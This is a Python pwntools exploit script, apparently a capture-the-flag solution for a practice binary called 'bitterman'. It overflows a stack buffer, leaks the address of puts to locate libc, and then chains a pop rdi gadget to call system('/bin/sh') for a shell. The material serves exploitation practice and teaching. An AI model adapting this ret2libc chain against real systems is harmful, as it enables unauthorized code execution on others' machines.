#!/usr/bin/python
from pwn import *
#opens up in a  new tmux window
context(terminal=['tmux' , 'new-window'])
# becomes handy once you stuck
#p=gdb.debug('./bitterman' , 'b main')
#Linux info for pwntools
context(os="Linux" , arch="amd64")
#opens up the binary
p=process('./bitterman')
# objdump -D bitterman | grep main , puts 
main = p64(0x4006ec)
puts_plt=p64(0x400520)
puts_got=p64(0x600c50)
 #R2 BITTERMAN; /R rdi
 # 0x00400853                 5f  pop rdi                                      
 # 0x00400854                 c3  ret  
pop_rdi=p64(0x400853)
#gdb bitterman pattern create 1000 ; pattern offset at the value of sigev
junk="A"*152
#skeleton payload to leak the puts addres @ Glibc
payload=junk+pop_rdi+puts_got+puts_plt+main
# some pwntools magic to send the payload ;)
p.recvuntil("name?")
p.sendline("pu")
p.recvuntil("message:")
p.sendline("1000")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
leak = p.recv()[:8].strip().ljust(8, '\x00')
log.success("Leaked Address (Puts) : "+ str(leak))
leak = u64(leak)#unpack the leak address

#leak = struct.unpack('Q', leak)[0] ;becomes handy if the above u64 didn't works 
# the hard part, The stategey is to first get the address where the libc sits in the memory and in the binary and then subtract those thow memory to get the actual offset of the binary, so every time the binary runs it will make new offsets and new offset + memory of the main,system,and /bin/sh gives us the actual address of the main , system,/bin/sh ;) 
put_libc = 0x74040
system_libc = 0x46ff0
binsh = 0x183cee

offset = leak - put_libc
sys = p64(offset + system_libc)
sh = p64(offset + binsh)
payload = junk + pop_rdi + sh + sys
#p.recvuntil("name?")
p.sendline("pu")
p.recvuntil("message:")
p.sendline("1000")
p.recvuntil("text:")
p.sendline(payload)
p.recvuntil("Thanks!")
p.interactive()
